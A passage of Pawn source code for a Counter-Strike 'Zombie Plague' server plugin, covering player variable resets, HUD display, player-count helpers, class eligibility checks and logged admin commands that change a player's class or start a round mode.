			else if( gMolotov[id][0] > 0 || gMolotov[id][1] > 0 || gMolotov[id][2] > 0 )
			{
				entity_set_string( id, EV_SZ_viewmodel, "models/molotov/v_molotov.mdl" )
				entity_set_string( id, EV_SZ_weaponmodel, "models/molotov/p_molotov.mdl" )
			}
			#endif
			else entity_set_string( id, EV_SZ_viewmodel, "models/zombie_plague/v_grenade_fire.mdl" )
		}
		case CSW_FLASHBANG: entity_set_string( id, EV_SZ_viewmodel, "models/zombie_plague/v_grenade_frost.mdl" ) // Frost grenade
		case CSW_SMOKEGRENADE:
		{
			if( gBubble[id] > 0 ) entity_set_string( id, EV_SZ_viewmodel, "models/zombie_plague/tcs_v_bubble.mdl" ) // Bubble grenade
			else entity_set_string( id, EV_SZ_viewmodel, "models/zombie_plague/v_grenade_flare.mdl" ) // Flare grenade
		}
	}
}

// Reset Player Vars
reset_vars(id, resetall)
{
	g_zombie[id] = false
	g_nemesis[id] = false
	gTroll[id] = false
	g_survivor[id] = false
	gPlayersL4D[id] = { false, false, false, false }
	gWesker[id] = false
	gJason[id] = false
	gSniper[id] = false
	g_firstzombie[id] = false
	g_lastzombie[id] = false
	g_lasthuman[id] = false
	g_frozen[id] = 0
	g_nodamage[id] = false
	g_respawn_as_zombie[id] = false
	g_nvision[id] = false
	g_nvisionenabled[id] = false
	g_canbuy[id] = true
	g_burning_duration[id] = 0
	gHaveBazooka[id] = 0
	gPowerFull[id] = 0
	
	gLogro_CountKill[id] = 0;
	gLogro_Infects[id] = 0;
	gLogro_ElZombieNoDie[id] = 0;
	gLogro_CountDmg[id] = 0;
	
	if (resetall)
	{
		g_zombieclass[id] = 0
		g_zombieclassnext[id] = 0
		
		g_humanclass[id] = 0
		g_humanclassnext[id] = 0
		
		g_damagedealt[id] = 0
		
		RemoveAllWeaponsEdit(id, ARMA_PRIMARIA)
		RemoveAllWeaponsEdit(id, ARMA_SECUNDARIA)
		
		WPN_AUTO_ON = 0
		WPN_AUTO_PRI = 0
		WPN_AUTO_SEC = 0
		WPN_AUTO_TER = 0
		
		gLevel[id] = 1
		gReset[id] = 0
		
		g_ammopacks[id] = 0
		
		gDmgEcho[id] = 0
		gDmgRec[id] = 0
		gKills[id] = 0
		gKillsRec[id] = 0
		gInfects[id] = 0
		gInfectsRec[id] = 0
		
		g_color_nvg[id] = { 0, 200, 0 }
		g_color_hud[id] = { 0, 200, 0 }
		g_hud_xyc[id][0] = HUD_STATS_X
		g_hud_xyc[id][1] = HUD_STATS_Y
		g_hud_xyc[id][2] = 0.00
		
		gPoints[id] = { 0, 0, 0, 0, 0 }
		
		for(new a = 0; a < MAX_HAB; a++)
		{
			for(new b = 0; b < MAX_SPECIAL_HABILITIES; b++)
			{
				g_hab[id][a][b] = 0;
			}
		}
		
		for(new a = 0; a < MAX_CLASS; a++)
		{
			for(new b = 0; b < MAX_HUMANS_LOGROS; b++)
			{
				g_logro[id][a][b] = 0;
			}
		}
		
		gTH_Mult[id] = { 1, 1 }
		
		gImpact[id] = { 1, 1, 1, 1 }
		gShowMenu[id] = 1
		
		gLogeado[id] = 0
		gRegistrado[id] = 0
		
		gMaxCombo[id] = 0
		
		gApost[id] = { 0, 0 }
		
		g_antidotecounter[id] = 1
		ITEM_EXTRA_BalasInfinitas[id] = 0
		ITEM_EXTRA_BalasPrecision[id] = 0
		
		gFuriaMax[id] = 3
		gBombaMax[id] = 0
		
		gViewInvisible[id] = 0;
		
		gYaAposto[id] = 0;
		
		gApostG[id] = { 0, 0 }
		
		gAP_Percent[id] = 0.0;
	}
}

// Set spectators nightvision
public spec_nvision(id)
{
	// Not connected, alive, or bot
	if (!g_isconnected[id] || g_isalive[id])
		return;
	
	// Give Night Vision?
	g_nvision[id] = true
	g_nvisionenabled[id] = true
	
	// Custom nvg?
	remove_task(id+TASK_NVISION)
	set_task(0.1, "set_user_nvision", id+TASK_NVISION, _, _, "b")
}

// Show HUD Task
public ShowHUD(taskid)
{
	static id
	id = ID_SHOWHUD;
	
	// Player died?
	if (!g_isalive[id])
	{
		// Get spectating target
		id = pev(id, PEV_SPEC_TARGET)
		
		// Target not alive
		if (!g_isalive[id]) return;
	}
	
	// Format classname
	static p_CHALECO[32], p_RESET[32];
	
	if (g_zombie[id]) // zombies
	{
		formatex(p_CHALECO, charsmax(p_CHALECO), "")
	}
	else // humans
	{
		formatex(p_CHALECO, charsmax(p_CHALECO), "Chaleco: %d^n", get_user_armor(ID_SHOWHUD))
	}
	
	// Static vars
	static szHP[15], szAPS[15], szResetS[32];
	
	// Spectating someone else?
	if (id != ID_SHOWHUD)
	{
		// Add dots
		AddDot(get_user_health(id), szHP, 14)
		AddDot(g_ammopacks[id], szAPS, 14)
		
		formatex(szResetS, charsmax(szResetS), "S.%d", gReset[id] - 5)
		formatex(p_RESET, charsmax(p_RESET), " - Rango: %s", (gReset[id] > 5) ? szResetS : gRESET_CLASS[gReset[id]])
		
		// Show name, health, class, and ammo packs
		set_hudmessage(255, 255, 255, HUD_SPECT_X, HUD_SPECT_Y, 0, 6.0, 1.1, 0.0, 0.0, -1)
		ShowSyncHudMsg(ID_SHOWHUD, g_MsgSync2, "Vida: %s - Clase: %s^nNivel: %d - AmmoPacks: %s%s", szHP, gClass[id], gLevel[id], szAPS, (gReset[id] > 0) ? p_RESET : "")
	}
	else
	{
		// Add dots
		AddDot(get_user_health(ID_SHOWHUD), szHP, 14)
		AddDot(g_ammopacks[ID_SHOWHUD], szAPS, 14)
		
		formatex(szResetS, charsmax(szResetS), "S.%d", gReset[ID_SHOWHUD] - 5)
		formatex(p_RESET, charsmax(p_RESET), "^nRango: %s", (gReset[ID_SHOWHUD] > 5) ? szResetS : gRESET_CLASS[gReset[ID_SHOWHUD]])
		
		// Show health, class and ammo packs
		set_hudmessage(g_color_hud[id][0], g_color_hud[id][1], g_color_hud[id][2], g_hud_xyc[id][0], g_hud_xyc[id][1], 0, 6.0, 1.1, 0.0, 0.0, -1)
		ShowSyncHudMsg(ID_SHOWHUD, g_MsgSync2, "Vida: %s^n%sClase: %s^nNivel: %d^nAmmoPacks: %s (%0.2f%%)%s", szHP, p_CHALECO, gClass[ID_SHOWHUD], gLevel[ID_SHOWHUD],
		szAPS, gAP_Percent[ID_SHOWHUD], (gReset[ID_SHOWHUD] > 0) ? p_RESET : "")
	}
}

// Play idle zombie sounds
public zombie_play_idle(taskid)
{
	// Round ended/new one starting
	if (g_endround || g_newround)
		return;
	
	//static sound[64]
	
	// Last zombie?
	if (g_lastzombie[ID_BLOOD])
	{
		//ArrayGetString(zombie_idle_last, random_num(0, ArraySize(zombie_idle_last) - 1), sound, charsmax(sound))
		emit_sound(ID_BLOOD, CHAN_VOICE, gSOUND_ZOMBIE_IDLE_LAST, 1.0, ATTN_NORM, 0, PITCH_NORM)
	}
	else
	{
		//ArrayGetString(zombie_idle, random_num(0, ArraySize(zombie_idle) - 1), sound, charsmax(sound))
		emit_sound(ID_BLOOD, CHAN_VOICE, gSOUND_ZOMBIE_IDLE[random_num(0, sizeof gSOUND_ZOMBIE_IDLE -1)], 1.0, ATTN_NORM, 0, PITCH_NORM)
	}
}

// Madness Over Task
public madness_over(taskid)
{
	g_nodamage[ID_BLOOD] = false
	fm_set_user_longjump(ID_BLOOD, false, false)
}

// Place user at a random spawn
do_random_spawn(id, regularspawns = 0)
{
	static hull, sp_index, i
	
	// Get whether the player is crouching
	hull = (pev(id, pev_flags) & FL_DUCKING) ? HULL_HEAD : HULL_HUMAN
	
	// Use regular spawns?
	if (!regularspawns)
	{
		// No spawns?
		if (!g_spawnCount)
			return;
		
		// Choose random spawn to start looping at
		sp_index = random_num(0, g_spawnCount - 1)
		
		// Try to find a clear spawn
		for (i = sp_index + 1; /*no condition*/; i++)
		{
			// Start over when we reach the end
			if (i >= g_spawnCount) i = 0
			
			// Free spawn space?
			if (is_hull_vacant(g_spawns[i], hull))
			{
				// Engfunc_SetOrigin is used so ent's mins and maxs get updated instantly
				engfunc(EngFunc_SetOrigin, id, g_spawns[i])
				break;
			}
			
			// Loop completed, no free space found
			if (i == sp_index) break;
		}
	}
	else
	{
		// No spawns?
		if (!g_spawnCount2)
			return;
		
		// Choose random spawn to start looping at
		sp_index = random_num(0, g_spawnCount2 - 1)
		
		// Try to find a clear spawn
		for (i = sp_index + 1; /*no condition*/; i++)
		{
			// Start over when we reach the end
			if (i >= g_spawnCount2) i = 0
			
			// Free spawn space?
			if (is_hull_vacant(g_spawns2[i], hull))
			{
				// Engfunc_SetOrigin is used so ent's mins and maxs get updated instantly
				engfunc(EngFunc_SetOrigin, id, g_spawns2[i])
				break;
			}
			
			// Loop completed, no free space found
			if (i == sp_index) break;
		}
	}
}

// Get Zombies -returns alive zombies number-
fnGetZombies()
{
	static iZombies, id
	iZombies = 0
	
	for (id = 1; id <= g_maxplayers; id++)
	{
		if (g_isalive[id] && g_zombie[id])
			iZombies++
	}
	
	return iZombies;
}

// Get Humans -returns alive humans number-
fnGetHumans()
{
	static iHumans, id
	iHumans = 0
	
	for (id = 1; id <= g_maxplayers; id++)
	{
		if (g_isalive[id] && !g_zombie[id])
			iHumans++
	}
	
	return iHumans;
}

// Get Nemesis -returns alive nemesis number-
fnGetNemesis()
{
	static iNemesis, id
	iNemesis = 0
	
	for (id = 1; id <= g_maxplayers; id++)
	{
		if (g_isalive[id] && g_nemesis[id])
			iNemesis++
	}
	
	return iNemesis;
}

// Get Survivors -returns alive survivors number-
fnGetSurvivors()
{
	static iSurvivors, id
	iSurvivors = 0
	
	for (id = 1; id <= g_maxplayers; id++)
	{
		if (g_isalive[id] && g_survivor[id])
			iSurvivors++
	}
	
	return iSurvivors;
}

// Get Alive -returns alive players number-
fnGetAlive()
{
	static iAlive, id
	iAlive = 0
	
	for (id = 1; id <= g_maxplayers; id++)
	{
		if (g_isalive[id])
			iAlive++
	}
	
	return iAlive;
}

// Get Random Alive -returns index of alive player number n -
fnGetRandomAlive(n)
{
	static iAlive, id
	iAlive = 0
	
	for (id = 1; id <= g_maxplayers; id++)
	{
		if (g_isalive[id])
			iAlive++
		
		if (iAlive == n)
			return id;
	}
	
	return -1;
}

// Get Playing -returns number of users playing-
fnGetPlaying()
{
	static iPlaying, id, team
	iPlaying = 0
	
	for (id = 1; id <= g_maxplayers; id++)
	{
		if (g_isconnected[id])
		{
			team = fm_cs_get_user_team(id)
			
			if (team != FM_CS_TEAM_SPECTATOR && team != FM_CS_TEAM_UNASSIGNED)
				iPlaying++
		}
	}
	
	return iPlaying;
}

// Get CTs -returns number of CTs connected-
fnGetCTs()
{
	static iCTs, id
	iCTs = 0
	
	for (id = 1; id <= g_maxplayers; id++)
	{
		if (g_isconnected[id])
		{			
			if (fm_cs_get_user_team(id) == FM_CS_TEAM_CT)
				iCTs++
		}
	}
	
	return iCTs;
}

// Get Ts -returns number of Ts connected-
fnGetTs()
{
	static iTs, id
	iTs = 0
	
	for (id = 1; id <= g_maxplayers; id++)
	{
		if (g_isconnected[id])
		{			
			if (fm_cs_get_user_team(id) == FM_CS_TEAM_T)
				iTs++
		}
	}
	
	return iTs;
}

// Get Alive CTs -returns number of CTs alive-
fnGetAliveCTs()
{
	static iCTs, id
	iCTs = 0
	
	for (id = 1; id <= g_maxplayers; id++)
	{
		if (g_isalive[id])
		{			
			if (fm_cs_get_user_team(id) == FM_CS_TEAM_CT)
				iCTs++
		}
	}
	
	return iCTs;
}

// Get Alive Ts -returns number of Ts alive-
fnGetAliveTs()
{
	static iTs, id
	iTs = 0
	
	for (id = 1; id <= g_maxplayers; id++)
	{
		if (g_isalive[id])
		{			
			if (fm_cs_get_user_team(id) == FM_CS_TEAM_T)
				iTs++
		}
	}
	
	return iTs;
}

// Last Zombie Check -check for last zombie and set its flag-
fnCheckLastZombie()
{
	static id
	for (id = 1; id <= g_maxplayers; id++)
	{
		// Last zombie
		if (g_isalive[id] && g_zombie[id] && !g_nemesis[id] && fnGetZombies() == 1)
		{
			if (!g_lastzombie[id])
			{
				// Last zombie forward
				//ExecuteForward(g_fwUserLastZombie, g_fwDummyResult, id);
			}
			g_lastzombie[id] = true
		}
		else
			g_lastzombie[id] = false
		
		// Last human
		if (g_isalive[id] && !g_zombie[id] && !g_survivor[id] && fnGetHumans() == 1)
		{
			if (!g_lasthuman[id])
			{
				// Last human forward
				//ExecuteForward(g_fwUserLastHuman, g_fwDummyResult, id);
			}
			g_lasthuman[id] = true
		}
		else
			g_lasthuman[id] = false
	}
}

// Checks if a player is allowed to be zombie
allowed_zombie(id)
{
	if ((g_zombie[id] && !g_nemesis[id] && !gTroll[id]) || g_endround || !g_isalive[id] || task_exists(TASK_WELCOMEMSG) || (!g_newround && !g_zombie[id] && fnGetHumans() == 1))
		return false;
	
	return true;
}

// Checks if a player is allowed to be human
allowed_human(id)
{
	if ((!g_zombie[id] && !g_survivor[id] && gPlayersL4D[id][0] && gPlayersL4D[id][1] && gPlayersL4D[id][2] && gPlayersL4D[id][3] && gWesker[id] && gJason[id] &&
	gSniper[id]) || g_endround || !g_isalive[id] || task_exists(TASK_WELCOMEMSG) || (!g_newround && g_zombie[id] && fnGetZombies() == 1))
		return false;
	
	return true;
}

// Checks if a player is allowed to be survivor
allowed_survivor(id)
{
	if (g_endround || g_survivor[id] || gPlayersL4D[id][0] || gPlayersL4D[id][1] || gPlayersL4D[id][2] || gPlayersL4D[id][3] || gWesker[id] || gJason[id] ||
	gSniper[id] || !g_isalive[id] || task_exists(TASK_WELCOMEMSG) || (!g_newround && g_zombie[id] && fnGetZombies() == 1))
		return false;
	
	return true;
}

// Checks if a player is allowed to be wesker
allowed_wesker(id)
{
	if (g_endround || g_survivor[id] || gPlayersL4D[id][0] || gPlayersL4D[id][1] || gPlayersL4D[id][2] || gPlayersL4D[id][3] || gWesker[id] || gJason[id] ||
	gSniper[id] || !g_isalive[id] || task_exists(TASK_WELCOMEMSG) || (!g_newround && g_zombie[id] && fnGetZombies() == 1))
		return false;
	
	return true;
}

// Checks if a player is allowed to be ninja
allowed_ninja(id)
{
	if (g_endround || g_survivor[id] || gPlayersL4D[id][0] || gPlayersL4D[id][1] || gPlayersL4D[id][2] || gPlayersL4D[id][3] || gWesker[id] || gJason[id] ||
	gSniper[id] || !g_isalive[id] || task_exists(TASK_WELCOMEMSG) || (!g_newround && g_zombie[id] && fnGetZombies() == 1))
		return false;
	
	return true;
}

// Checks if a player is allowed to be troll
allowed_troll(id)
{
	if (g_endround || g_nemesis[id] || gTroll[id] || !g_isalive[id] || task_exists(TASK_WELCOMEMSG) || (!g_newround && !g_zombie[id] && fnGetHumans() == 1))
		return false;
	
	return true;
}

// Checks if a player is allowed to be sniper
/*allowed_sniper(id)
{
	if (g_endround || g_survivor[id] || gPlayersL4D[id][0] || gPlayersL4D[id][1] || gPlayersL4D[id][2] || gPlayersL4D[id][3] || gWesker[id] || gJason[id] ||
	gSniper[id] || !g_isalive[id] || task_exists(TASK_WELCOMEMSG) || (!g_newround && g_zombie[id] && fnGetZombies() == 1))
		return false;
	
	return true;
}*/

// Checks if a player is allowed to be nemesis
allowed_nemesis(id)
{
	if (g_endround || g_nemesis[id] || gTroll[id] || !g_isalive[id] || task_exists(TASK_WELCOMEMSG) || (!g_newround && !g_zombie[id] && fnGetHumans() == 1))
		return false;
	
	return true;
}

// Checks if a player is allowed to respawn
allowed_respawn(id)
{
	static team
	team = fm_cs_get_user_team(id)
	
	if (g_endround || team == FM_CS_TEAM_SPECTATOR || team == FM_CS_TEAM_UNASSIGNED || is_user_alive(id))
		return false;
	
	return true;
}

// Checks if swarm mode is allowed
allowed_swarm()
{
	if (g_endround || !g_newround || task_exists(TASK_WELCOMEMSG))
		return false;
	
	return true;
}

// Checks if multi infection mode is allowed
allowed_multi()
{
	if (g_endround || !g_newround || task_exists(TASK_WELCOMEMSG) || floatround(fnGetAlive()*0.37, floatround_ceil) < 2 || floatround(fnGetAlive()*0.37, floatround_ceil) >= fnGetAlive())
		return false;
	
	return true;
}

// Checks if plague mode is allowed
allowed_plague()
{
	if (g_endround || !g_newround || task_exists(TASK_WELCOMEMSG) || floatround((fnGetAlive()-2)*0.5, floatround_ceil) < 1
	|| fnGetAlive()-(2+floatround((fnGetAlive()-2)*0.5, floatround_ceil)) < 1)
		return false;
	
	return true;
}

// Admin Command. zp_zombie
command_zombie(id, player)
{
	// Show activity?
	client_print(0, print_chat, "ADMIN %s - %s convertido en zombie", g_playername[id], g_playername[player])
	
	// Log to Zombie Plague log file?
	static logdata[256], ip[16]
	get_user_ip(id, ip, charsmax(ip), 1)
	formatex(logdata, charsmax(logdata), "ADMIN %s <%s> - %s convertido en zombie (Players: %d/%d)", g_playername[id], ip, g_playername[player], fnGetPlaying(), g_maxplayers)
	log_to_file("zombieplague.log", logdata)
	
	// New round?
	if (g_newround)
	{
		// Set as first zombie
		remove_task(TASK_MAKEZOMBIE)
		make_a_zombie(MODE_INFECTION, player)
	}
	else
	{
		// Just infect
		zombieme(player, 0, 0, 0, 0, 0)
	}
}

// Admin Command. zp_human
command_human(id, player)
{
	// Show activity?
	client_print(0, print_chat, "ADMIN %s - %s convertido en humano", g_playername[id], g_playername[player])
	
	// Log to Zombie Plague log file?
	static logdata[256], ip[16]
	get_user_ip(id, ip, charsmax(ip), 1)
	formatex(logdata, charsmax(logdata), "ADMIN %s <%s> - %s convertido en humano (Players: %d/%d)", g_playername[id], ip, g_playername[player], fnGetPlaying(), g_maxplayers)
	log_to_file("zombieplague.log", logdata)
	
	// Turn to human
	humanme(player, 0, 0, 0, 0, 0, 0)
}

// Admin Command. zp_survivor
command_survivor(id, player)
{
	// Show activity?
	client_print(0, print_chat, "ADMIN %s - %s convertido en survivor", g_playername[id], g_playername[player])
	
	// Log to Zombie Plague log file?
	static logdata[100], ip[16]
	get_user_ip(id, ip, charsmax(ip), 1)
	formatex(logdata, charsmax(logdata), "ADMIN %s <%s> - %s convertido en survivor (Players: %d/%d)", g_playername[id], ip, g_playername[player], fnGetPlaying(), g_maxplayers)
	log_to_file("zombieplague.log", logdata)
	
	// New round?
	if (g_newround)
	{
		// Set as first survivor
		remove_task(TASK_MAKEZOMBIE)
		make_a_zombie(MODE_SURVIVOR, player)
	}
	else
	{
		// Turn player into a Survivor
		humanme(player, 1, 0, 0, 0, 0, 0)
	}
}

// Admin Command. zp_nemesis
command_nemesis(id, player)
{
	// Show activity?
	client_print(0, print_chat, "ADMIN %s - %s convertido en nemesis", g_playername[id], g_playername[player])
	
	// Log to Zombie Plague log file?
	static logdata[256], ip[16]
	get_user_ip(id, ip, charsmax(ip), 1)
	formatex(logdata, charsmax(logdata), "ADMIN %s <%s> - %s convertido en nemesis (Players: %d/%d)", g_playername[id], ip, g_playername[player], fnGetPlaying(), g_maxplayers)
	log_to_file("zombieplague.log", logdata)
	
	// New round?
	if (g_newround)
	{
		// Set as first nemesis
		remove_task(TASK_MAKEZOMBIE)
		make_a_zombie(MODE_NEMESIS, player)
	}
	else
	{
		// Turn player into a Nemesis
		zombieme(player, 0, 1, 0, 0, 0)
	}
}

// Admin Command. zp_respawn
command_respawn(id, player)
{
	// Show activity?
	client_print(0, print_chat, "ADMIN %s - %s revivido", g_playername[id], g_playername[player])
	
	// Log to Zombie Plague log file?
	static logdata[256], ip[16]
	get_user_ip(id, ip, charsmax(ip), 1)
	formatex(logdata, charsmax(logdata), "ADMIN %s <%s> - %s revivido (Players: %d/%d)", g_playername[id], ip, g_playername[player], fnGetPlaying(), g_maxplayers)
	log_to_file("zombieplague.log", logdata)

	// Respawn as zombie?
	if( fnGetZombies() < (fnGetAlive()/2) )
		g_respawn_as_zombie[player] = true
	
	// Override respawn as zombie setting on nemesis and survivor rounds
	if (g_survround || gArmageddonRound || gL4DRound || gWeskerRound || gJasonRound || gSniperRound) g_respawn_as_zombie[player] = true
	else if (g_nemround || gTrollRound || gSynapsisRound || gTaringaRound) g_respawn_as_zombie[player] = false
	
	respawn_player_manually(player);
}

// Admin Command. zp_swarm
command_swarm(id)
{
	// Show activity?
	client_print(0, print_chat, "ADMIN %s - comenzar modo swarm", g_playername[id])
	
	// Log to Zombie Plague log file?
	static logdata[256], ip[16]
	get_user_ip(id, ip, charsmax(ip), 1)
	formatex(logdata, charsmax(logdata), "ADMIN %s <%s> - comenzar modo swarm (Players: %d/%d)", g_playername[id], ip, fnGetPlaying(), g_maxplayers)
	log_to_file("zombieplague.log", logdata)
	
	// Call Swarm Mode
	remove_task(TASK_MAKEZOMBIE)
	make_a_zombie(MODE_SWARM, 0)
}

// Admin Command. zp_multi
command_multi(id)
{
	// Show activity?
	client_print(0, print_chat, "ADMIN %s - comenzar infeccion multiple", g_playername[id])
	
	// Log to Zombie Plague log file?
	static logdata[256], ip[16]
	get_user_ip(id, ip, charsmax(ip), 1)
	formatex(logdata, charsmax(logdata), "ADMIN %s <%s> - comenzar infeccion multiple (Players: %d/%d)", g_playername[id], ip, fnGetPlaying(), g_maxplayers)
	log_to_file("zombieplague.log", logdata)
	
	// Call Multi Infection
	remove_task(TASK_MAKEZOMBIE)
	make_a_zombie(MODE_MULTI, 0)
}

// Admin Command. zp_plague
command_plague(id)
{
	// Show activity?
	client_print(0, print_chat, "ADMIN %s - comenzar modo plague", g_playername[id])
	
	// Log to Zombie Plague log file?
	static logdata[256], ip[16]
	get_user_ip(id, ip, charsmax(ip), 1)
	formatex(logdata, charsmax(logdata), "ADMIN %s <%s> - comenzar modo plague (Players: %d/%d)", g_playername[id], ip, fnGetPlaying(), g_maxplayers)
	log_to_file("zombieplague.log", logdata)
	
	// Call Plague Mode
	remove_task(TASK_MAKEZOMBIE)
	make_a_zombie(MODE_PLAGUE, 0)
}

// Admin Command. zp_armageddon
command_armageddon(id)
{
	// Show activity?
	client_print(0, print_chat, "ADMIN %s - comenzar modo armageddon", g_playername[id])
	
	// Log to Zombie Plague log file?
	static logdata[256], ip[16]
	get_user_ip(id, ip, charsmax(ip), 1)
	formatex(logdata, charsmax(logdata), "ADMIN %s <%s> - comenzar modo armageddon. (Players: %d/%d)", g_playername[id], ip, fnGetPlaying(), g_maxplayers)
	log_to_file("zombieplague.log", logdata)
	
	// Call Armageddon Mode
	remove_task(TASK_MAKEZOMBIE)
	make_a_zombie(MODE_ARMAGEDDON, 0)
}

// Admin Command. zp_synapsis
command_synapsis(id)
{
	// Show activity?
	client_print(0, print_chat, "ADMIN %s - comenzar modo synapsis", g_playername[id])
	
	// Log to Zombie Plague log file?
	static logdata[256], ip[16]
	get_user_ip(id, ip, charsmax(ip), 1)
	formatex(logdata, charsmax(logdata), "ADMIN %s <%s> - comenzar modo synapsis (Players: %d/%d)", g_playername[id], ip, fnGetPlaying(), g_maxplayers)
	log_to_file("zombieplague.log", logdata)
	
	// Call Synapsis Mode
	remove_task(TASK_MAKEZOMBIE)
	make_a_zombie(MODE_SYNAPSIS, 0)
}

// Admin Command. zp_l4d
command_l4d(id)
{
	// Show activity?
	client_print(0, print_chat, "ADMIN %s - comenzar modo L4D", g_playername[id])
	
	// Log to Zombie Plague log file?
	static logdata[256], ip[16]
	get_user_ip(id, ip, charsmax(ip), 1)
	formatex(logdata, charsmax(logdata), "ADMIN %s <%s> - comenzar modo L4D (Players: %d/%d)", g_playername[id], ip, fnGetPlaying(), g_maxplayers)
	log_to_file("zombieplague.log", logdata)
	
	// Call L4D Mode
	remove_task(TASK_MAKEZOMBIE)
	make_a_zombie(MODE_L4D, 0)
}

// Admin Command. zp_wesker
command_wesker(id, player)
{
	// Show activity?
	client_print(0, print_chat, "ADMIN %s - %s convertido en wesker", g_playername[id], g_playername[player])
	
	// Log to Zombie Plague log file?
	static logdata[256], ip[16]
	get_user_ip(id, ip, charsmax(ip), 1)
	formatex(logdata, charsmax(logdata), "ADMIN %s <%s> - %s convertido en wesker (Players: %d/%d)", g_playername[id], ip, g_playername[player], fnGetPlaying(), g_maxplayers)
	log_to_file("zombieplague.log", logdata)
	
	// New round?
	if (g_newround)
	{
		// Set as first raptor
		remove_task(TASK_MAKEZOMBIE)
		make_a_zombie(MODE_WESKER, player)
	}
	else
	{
		// Turn player into a Wesker
		humanme(player, 0, 0, 0, 1, 0, 0)
	}
}

// Admin Command. zp_ninja
command_ninja(id, player)
{
	// Show activity?
	client_print(0, print_chat, "ADMIN %s - %s convertido en jason", g_playername[id], g_playername[player])
	
	// Log to Zombie Plague log file?
	static logdata[256], ip[16]
	get_user_ip(id, ip, charsmax(ip), 1)
	formatex(logdata, charsmax(logdata), "ADMIN %s <%s> - %s convertido en jason (Players: %d/%d)", g_playername[id], ip, g_playername[player], fnGetPlaying(), g_maxplayers)
	log_to_file("zombieplague.log", logdata)
	
	// New round?
	if (g_newround)
	{
		// Set as first raptor
		remove_task(TASK_MAKEZOMBIE)
		make_a_zombie(MODE_NINJA, player)
	}
	else
	{
		// Turn player into a Ninja
		humanme(player, 0, 0, 0, 0, 1, 0)
	}
}

// Admin Command. zp_sniper
/*command_sniper(id, player)
{
	// Show activity?
	client_print(0, print_chat, "ADMIN %s - %s convertido en Sniper", g_playername[id], g_playername[player])
	
	// Log to Zombie Plague log file?
	static logdata[256], ip[16]
	get_user_ip(id, ip, charsmax(ip), 1)
	formatex(logdata, charsmax(logdata), "ADMIN %s <%s> - %s convertido en Sniper (Players: %d/%d)", g_playername[id], ip, g_playername[player], fnGetPlaying(), g_maxplayers)
	log_to_file("zombieplague.log", logdata)
	
	// New round?
	if (g_newround)
	{
		// Set as first raptor
		remove_task(TASK_MAKEZOMBIE)
		make_a_zombie(MODE_SNIPER, player)
	}
	else
	{
		// Turn player into a Sniper
		humanme(player, 0, 0, 0, 0, 0, 1)
	}
}*/

// Admin Command. zp_taringa
command_sniper__(id)
{
	// Show activity?
	client_print(0, print_chat, "ADMIN %s - comenzar modo sniper", g_playername[id])
	
	// Log to Zombie Plague log file?
	static logdata[256], ip[16]
	get_user_ip(id, ip, charsmax(ip), 1)
	formatex(logdata, charsmax(logdata), "ADMIN %s <%s> - comenzar modo sniper. (Players: %d/%d)", g_playername[id], ip, fnGetPlaying(), g_maxplayers)
	log_to_file("zombieplague.log", logdata)
	
	// Call Sniper Mode
	remove_task(TASK_MAKEZOMBIE)
	make_a_zombie(MODE_SNIPER, 0)
}

// Admin Command. zp_taringa
command_taringa(id)
{
	// Show activity?
	client_print(0, print_chat, "ADMIN %s - comenzar modo Taringa!", g_playername[id])
	
	// Log to Zombie Plague log file?
	static logdata[256], ip[16]
	get_user_ip(id, ip, charsmax(ip), 1)
	formatex(logdata, charsmax(logdata), "ADMIN %s <%s> - comenzar modo Taringa!. (Players: %d/%d)", g_playername[id], ip, fnGetPlaying(), g_maxplayers)
	log_to_file("zombieplague.log", logdata)
	
	// Call Taringa Mode
	remove_task(TASK_MAKEZOMBIE)
	make_a_zombie(MODE_TARINGA, 0)
}

// Admin Command. zp_troll
command_troll(id, player)
{
	// Show activity?
	client_print(0, print_chat, "ADMIN %s - %s convertido en troll", g_playername[id], g_playername[player])
	
	// Log to Zombie Plague log file?
	static logdata[256], ip[16]
	get_user_ip(id, ip, charsmax(ip), 1)
	formatex(logdata, charsmax(logdata), "ADMIN %s <%s> - %s convertido en troll (Players: %d/%d)", g_playername[id], ip, g_playername[player], fnGetPlaying(), g_maxplayers)
	log_to_file("zombieplague.log", logdata)
	
	// New round?
	if (g_newround)
	{
		// Set as first raptor
		remove_task(TASK_MAKEZOMBIE)
		make_a_zombie(MODE_TROLL, player)
	}
	else
	{
		// Turn player into a Troll
		zombieme(player, 0, 0, 0, 0, 1)
	}
}

/*================================================================================
 [Custom Natives]
=================================================================================*/

// Function: zp_register_extra_item (to be used within this plugin only)
native_register_extra_item2(const name[], cost, team)
{
	// Add the item
	ArrayPushString(g_extraitem_name, name)
	ArrayPushCell(g_extraitem_cost, cost)
	ArrayPushCell(g_extraitem_team, team)
	
	// Set temporary new item flag
	ArrayPushCell(g_extraitem_new, 1)
	
	// Increase registered items counter
	g_extraitem_i++
}

// Native: zp_register_zombie_class
native_register_zombie_class(const name[], const info[], const model[], const clawmodel[], hp, speed, Float:gravity, Float:damage, level, reset)
{
	// Arrays not yet initialized
	if (!g_arrays_created)
		return -1;
	
	// Strings passed byref
	/*param_convert(1)
	param_convert(2)
	param_convert(3)
	param_convert(4)*/
	
	// Add the class
	ArrayPushString(g_zclass_name, name)
	ArrayPushString(g_zclass_info, info)
	
	// Using same zombie models for all classes? NO
	ArrayPushCell(g_zclass_modelsstart, ArraySize(g_zclass_playermodel))
	ArrayPushString(g_zclass_playermodel, model)
	ArrayPushCell(g_zclass_modelsend, ArraySize(g_zclass_playermodel))
	ArrayPushCell(g_zclass_modelindex, -1)
	
	ArrayPushString(g_zclass_clawmodel, clawmodel)
	ArrayPushCell(g_zclass_hp, hp)
	ArrayPushCell(g_zclass_spd, speed)
	ArrayPushCell(g_zclass_grav, gravity)
	ArrayPushCell(g_zclass_dmg, damage)
	ArrayPushCell(g_zclass_level, level)
	ArrayPushCell(g_zclass_reset, reset)
	
	// Set temporary new class flag
	ArrayPushCell(g_zclass_new, 1)
	
	// Override zombie classes data with our customizations
	new i, k, buffer[32], Float:buffer2, nummodels_custom, nummodels_default, prec_mdl[100], size = ArraySize(g_zclass2_realname)
	for (i = 0; i < size; i++)
	{
		ArrayGetString(g_zclass2_realname, i, buffer, charsmax(buffer))
		
		// Check if this is the intended class to override
		if (!equal(name, buffer))
			continue;
		
		// Remove new class flag
		ArraySetCell(g_zclass_new, g_zclass_i, 0)
		
		// Replace caption
		ArrayGetString(g_zclass2_name, i, buffer, charsmax(buffer))
		ArraySetString(g_zclass_name, g_zclass_i, buffer)
		
		// Replace info
		ArrayGetString(g_zclass2_info, i, buffer, charsmax(buffer))
		ArraySetString(g_zclass_info, g_zclass_i, buffer)
		
		// Replace models, unless using same models for all classes
